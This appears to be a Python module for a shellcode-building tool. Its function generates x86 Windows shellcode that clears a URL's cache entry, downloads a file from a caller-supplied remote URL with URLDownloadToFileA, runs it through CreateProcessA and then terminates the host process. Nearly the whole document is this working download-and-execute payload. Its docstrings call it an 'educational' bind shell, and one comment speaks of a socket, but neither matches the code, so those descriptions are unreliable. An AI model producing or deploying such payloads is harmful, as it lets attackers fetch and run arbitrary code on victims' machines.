"""Bring-your-own-shellcode example for ``shellcoder-v2.py --custom``.

This wrapper demonstrates the custom-module contract while reusing the
educational bind-shell builder as a starting point for further changes.
"""

from shellcode.payload_utils import (
  flatten_asm,
  format_shellcode_asm,
)
from shellcode.push_string import push_string
from shellcode.shellcode_helper import ShellcodeHelper

def download_exec_shellcode(remote_url, local_file_path, bad_bytes=None):
  """Return bind-shell assembly using the standard custom-module signature.

  """
  var = ShellcodeHelper(bad_bytes=bad_bytes)

  # Add functions
  f_url_download_to_file = "URLDownloadToFileA" # urlmon.dll
  f_delete_url_cache = "DeleteUrlCacheEntryA" # wininet.dll
  f_term_process = "TerminateProcess" # kernel32.dll
  f_create_process = "CreateProcessA" # kernel32.dll

  for function_name in (
        f_url_download_to_file,
        f_delete_url_cache,
        f_create_process,
        f_term_process
    ):
        var.add(function_name)

  # Add variables as needed

  v_remote_file_url = "szURL"
  v_local_file_path = "szFileName"

  v_startup_info = "lpStartupInfo"
  v_proc_info = "lpProcessInformation"

  #url_len = var.align_dword(len(remote_url) + 1)
  #var.add(v_remote_file_url, reserve= url_len)
  var.add(v_remote_file_url)

  #local_file_path_len = var.align_dword(len(local_file_path) + 1)
  #var.add(v_local_file_path, reserve= local_file_path_len)
  var.add(v_local_file_path)

  var.add(v_proc_info, reserve=0x20)
  var.add(v_startup_info, reserve=0x44)

  asm = [
    "start:",
    #f"{['', 'int3;'][breakpoint]}"         ,
    var.get_esp_setup()                    , # reserve scratch space for variables and temporary structures
    var.get_clear_variables()              , # zero the stack-backed variable area
    var.get_common_shellcode()             , # locate kernel32 and bootstrap resolver helpers

    # Directly after the common shellcode, the find function routine will look in kernel32.dll until the
    # next library is loaded
    "   resolve_symbols_kernel32:         ",
    var.find_function(f_term_process)      ,
    var.find_function(f_create_process),
    
    "   load_wininet:                         ",
    var.load_library("wininet.dll"),
    
    "   resolve_symbols_wininet:         ",
    var.find_function(f_delete_url_cache),
    
    "   call_deleteurlcacheentrya:                    ",
    push_string(remote_url, target_reg="esi"),
    var.write_var(v_remote_file_url, reg_src="esi"),
    "   push esi",
    var.call_function(f_delete_url_cache),
    
    "   load_urlmon:                         ",
    var.load_library("urlmon.dll"),
    
    "   resolve_symbols_urlmon:         ",
    var.find_function(f_url_download_to_file),
    
    "   create_local_file_path:",
        push_string(local_file_path, target_reg="esi"),
        var.write_var(v_local_file_path, reg_src="esi"),
    
    "   call_urldownloadtofile:                    ",
        "       xor eax, eax                       ",
        "       push eax                           ",
        "       push eax                           ",
        var.push_var_value(v_local_file_path, "ebx"),
        var.push_var_value(v_remote_file_url, "ebx"),
        "       push eax                           ",
        var.call_function(f_url_download_to_file),
    
    "   create_startupinfoa:                 ",  # set cb and STARTF_USESTDHANDLES in STARTUPINFOA
    "       xor eax, eax                    ;",
    "       mov al, 0x44                    ;",
        var.write_var(v_startup_info, "eax", 0x00),  # offset 0x00: cb = sizeof(STARTUPINFOA)
    "       add al, 0xBB                    ;",  # eax = 0xFF
    "       inc eax                         ;",  # eax = 0x100
        var.write_var(v_startup_info, "eax", 0x2C),  # offset 0x2C: dwFlags = 0x100

      "   call_createprocessa:                 ",  # spawn cmd.exe with inherited stdio redirected to the socket
      var.push_var_address(v_proc_info),  # lpProcessInformation = ptr to v_proc_info
      var.push_var_address(v_startup_info),  # lpStartupInfo = ptr to v_startup_info
      "       xor eax, eax                    ;",
      "       push eax                        ;",  # lpCurrentDirectory = NULL
      "       push eax                        ;",  # lpEnvironment = NULL
      "       push eax                        ;",  # dwCreationFlags = NULL
      "       inc eax                         ;",  #
      "       push eax                        ;",  # bInheritHandles = TRUE
      "       dec eax                         ;",  #
      "       push eax                        ;",  # lpThreadAttributes = NULL
      "       push eax                        ;",  # lpProcessAttributes = NULL
      var.push_var_value(v_local_file_path, "ebx"),
      "       push eax                        ;",  # lpApplicationName = NULL
      var.call_function(f_create_process),
    
    "   exec_shellcode:                   ",  # terminate the original thread/process context after the child is created
        "       xor ecx, ecx             ;",
        "       push ecx                 ;",
        "       push 0xffffffff          ;",
        var.call_function(f_term_process),
  ]
  return format_shellcode_asm("\n".join(flatten_asm(asm)))
